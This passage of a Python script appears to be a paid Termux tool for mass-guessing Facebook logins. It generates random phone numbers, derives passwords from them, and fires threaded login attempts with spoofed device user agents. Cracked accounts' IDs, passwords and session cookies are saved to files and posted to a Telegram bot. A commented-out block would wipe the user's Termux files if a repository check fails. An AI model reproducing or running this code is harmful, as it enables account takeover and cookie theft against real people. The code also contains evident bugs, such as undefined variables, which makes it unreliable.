{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def fuckxd():
    os.system('clear')
    ____banner____()
#━━━━[ LINE ]━━━━#
def linex():
        print(f"{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#-------------------[LOCATION CHECK]-------------------#
"""uxernamx = sys.argv[0]
if uxernamx=='GREEN.py':
    try:
        readhead = open('.git/config','r').read()
    except:
        print('   Somting Wrong Bro')
        idx()
    if 'zar0-XD' in readhead:
        pass
    else:
        idx()
        os.system('rm -rf /data/data/com.termux/files');exit()
else:
    idx()
    os.system('rm -rf /data/data/com.termux/files');exit()"""
class Process:
    def __init__(self):
        self.cc=[]
        self.key="ATOM-"+base64.b16encode(str(os.getuid()).encode()).decode()+hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
        #self.key=""
        self.clear()
        r = self.Gex('https://github.com/DESTROYED-ATOM/ATOM/blob/main/Approve.txt')
        if self.key in r:
            self.enroll()
        else:
            self.clear()
            print("\x1b[38;1;97m               NOTES   ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HELLO.... DEAR USER THIS IS PREMIUM TOOLS ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m AFTER PAYMENT ACCESS TOOLS ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m PRICE LIST ADMIN INBOX ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key:\033[0;93m " +self.key)
            input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
            time.sleep(3.5)
            tks = 'TOKEN KEY =%20%20:%20'+self.key
            os.system('am start https://wa.me/+918389066877?text=' + tks)
            exit()
    def clear(self):os.system('clear');____banner____()
    def Gex(self,x):
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, x)
        c.setopt(c.WRITEDATA, buffer)
        try:c.perform()
        except:exit(' Network Issue')
        c.close()
        return buffer.getvalue().decode('utf-8')
    def enroll(self):
        zar0()

#━━━━[ MAIN ]━━━━#
def zar0():
    ____banner____()
    print(f'{rad}[{white}A{rad}]{rad}[{white}1{rad}] {green}KEEP ON FILE CLONE')
    print(f'{rad}[{white}B{rad}]{rad}[{white}2{rad}] {green}MAKE IT FILES')
    print(f'{rad}[{white}C{rad}]{rad}[{white}3{rad}] {green}KEEP ON RANDOM CLONE')
    print(f'{rad}[{white}D{rad}]{rad}[{white}4{rad}] {green}JOIN GROUP')
    print(f'{rad}[{white}E{rad}]{rad}[{white}5{rad}] {green}CONTRACK ADMIN');linex()
    __zar0__ = input(f'{rad}[{white}🔖{rad}] {green}Selection  {white}▶︎ {yelloww}')
    if __zar0__ in ['A','a','01','1']:__FILEX__()
    elif __zar0__ in ['B','b','02','2']:os.system('python3 FILE-DUMP.py')
    elif __zar0__ in ['C','c','03','3']:SETINGX()
    elif __zar0__ in ['D','d','04','4']:os.system("xdg-open https://wa.me/+918389066877")
    elif __zar0__ in ['E','e','05','5']:os.system("xdg-open https://wa.me/+918389066877")
    else:print(f'\n[×]{rad} Choose Value Option... ');zar0()

#━━━━[ SELECT MENU ]━━━━#
def SETINGX():
    ____banner____()
    print(f"{K} [{H}1{K}] {WHITE}RANDOM WITH BANGLADESH")
    print(f"{K} [{H}2{K}] {WHITE}RANDOM WITH INDIA V2")
    print(f"{K} [{H}3{K}] {WHITE}RANDOM WITH ALL COUNTRY");linex()
    __zar0i__ = input(f'{rad}[{white}🔖{rad}]{green} SELECTION  {white}▶︎ {yelloww}')
    if __zar0i__ in ['A','a','01','1']:RANDOM()
    elif __zar0i__ in ['B','b','02','2']:INDIA()
    elif __zar0i__ in ['C','c','03','3']:PAKISTAN()
    else:print(f'\n[×]{rad} Choose Value Option... ');SETINGX()

#━━━━[ BANGLADESH RANDOM ]━━━━#
def RANDOM():
  user=[]
  os.system('clear');____banner____();print(c7);print(led)
  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
 # print(led)
  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
 #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('m5')
  elif hc in ['6','06']:mtd.append('m6')
  elif hc in ['7','07']:mtd.append('m7')
  elif hc in ['8','08']:mtd.append('m8')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(6))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    ____banner____();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
    for guru in user:
      ids = kode+guru
      pwv = [ids[:6],ids[:8],ids,]
      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
      else:
       king_xd.submit(m5,ids,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python zar0.py')
#━━━━[ INDIAN RANDOM ]━━━━#
def INDIA():
  user=[]
  os.system('clear');____banner____();print(c7);print(led)
  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
 # print(led)
  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
 #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('m5')
  elif hc in ['6','06']:mtd.append('m6')
  elif hc in ['7','07']:mtd.append('m7')
  elif hc in ['8','08']:mtd.append('m8')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(6))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    ____banner____();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
    for guru in user:
      ids = kode+guru
      pwv = [ids[:6],ids[:8],ids,]
      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
      else:
       king_xd.submit(m5,ids,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python zar0.py')
#━━━━[ PAKISTAN RANDOM ]━━━━#
def PAKISTAN():
  user=[]
  os.system('clear');____banner____();print(c7);print(led)
  kode = input(f'{dot}SELECT CODE {M}: {H}');print(led);print(limitt);print(led)
  limit = int(input(f'{dot}ENTER LIMIT {M}: {H}'));print(led)
  xd_cp=input(f'{wt}SHOW CP ACCOUNT  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
  if xd_cp in ['y','Y','yes','Yes','1']:cp_xdx.append('y')
  else:cp_xdx.append('n')
 # print(led)
  #cokixx=input(f'{wt}SHOW COOKIES  {M}?{P} [{H}Y{P}/{K}N{P}] {M}:{H} ')
 #if cokixx in ['y','Y','yes','Yes','1']:cokix.append('y')
  #else:cokix.append('n')
  clear();____banner____();print(f"{dot}{P}SIM CODE  {RED}: {H}"+kode);print(led);print(f' {K}[{H}1{K}] {P}Method [{H}M1{P}]');print(f' {K}[{H}2{K}] {P}Method [{H}M2{P}]');print(f' {K}[{H}3{K}] {P}Method [{H}M3{P}]')
  print(f' {K}[{H}4{K}] {P}Method [{H}M4{P}]');print(f' {K}[{H}5{K}] {P}Method [{H}M5{P}]');print(f' {K}[{H}6{K}] {P}Method [{H}M6{P}]');print(f' {K}[{H}7{K}] {P}Method [{H}M7{P}]');print(f' {K}[{H}8{K}] {P}Method [{H}M8{P}]');print(led)
  hc = input(f'{wt}Select Method {M}:{H} ')
  if hc in ['1','01']:mtd.append('m1')
  elif hc in ['2','02']:mtd.append('m2')
  elif hc in ['3','03']:mtd.append('m3')
  elif hc in ['4','04']:mtd.append('m4')
  elif hc in ['5','05']:mtd.append('m5')
  elif hc in ['6','06']:mtd.append('m6')
  elif hc in ['7','07']:mtd.append('m7')
  elif hc in ['8','08']:mtd.append('m8')
  else:
      mtd.append('m1')
  for nmbr in range(limit):
    nmp = ''.join(random.choice(string.digits) for _ in range(6))
    user.append(nmp)
  with tred(max_workers=30) as king_xd:
    os.system('clear')
    tl = str(len(user))
    ____banner____();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
    for guru in user:
      ids = kode+guru
      pwv = [ids[:6],ids[:8],ids,]
      if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
      elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
      elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
      elif 'm4' in mtd:king_xd.submit(m4,ids,pwv)
      elif 'm5' in mtd:king_xd.submit(m5,ids,pwv)
      elif 'm6' in mtd:king_xd.submit(m6,ids,pwv)
      elif 'm7' in mtd:king_xd.submit(m7,ids,pwv)
      elif 'm8' in mtd:king_xd.submit(m8,ids,pwv)
      else:
       king_xd.submit(m5,ids,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python zar0.py')
#━━━━[ METHOD RANDOM ]━━━━#
def m1(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session=requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    sm2 =("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
    ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
    try:
        for pas in pwv:
            free_fb = session.get('https://free.facebook.com').text
            info={"jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),  "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),  "display": "", "isprivate": "", "return_session": "", "skip_api_login": "", "signed_next": "", "trynum": "1", "timezone": "420", "lgndim": "eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=", "lgnrnd": "233842_bVRw", "lgnjs": "1719902322", "email": ids, "prefill_contact_point": "ids", "prefill_source": "browser_dropdown", "prefill_type": "password", "first_prefill_source": "browser_dropdown", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "true", "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ", "encpass": "#PWD_BROWSER:5:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
            update={
            'User-Agent': ua3,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://lm.facebook.com/',
            'DNT': '1',
            'Pragma': 'no-cache',
            'TE': 'Trailers', }
            session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m2(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session=requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    sm2 =("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
    ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
    try:
        for pas in pwv:
            free_fb = session.get('https://m.facebook.com').text
            info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
            update={
            'User-Agent': "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+"Mobile Safari/537.36",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://lm.facebook.com/',
            'DNT': '1',
            'Pragma': 'no-cache',
            'TE': 'Trailers', }
            session.post('https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%2Fcancel%2F&li=6iKEZhsVXhKGcXY8k5F-hD3f&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{uid}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m3(ids,pwv):
    global loop,oks,cps
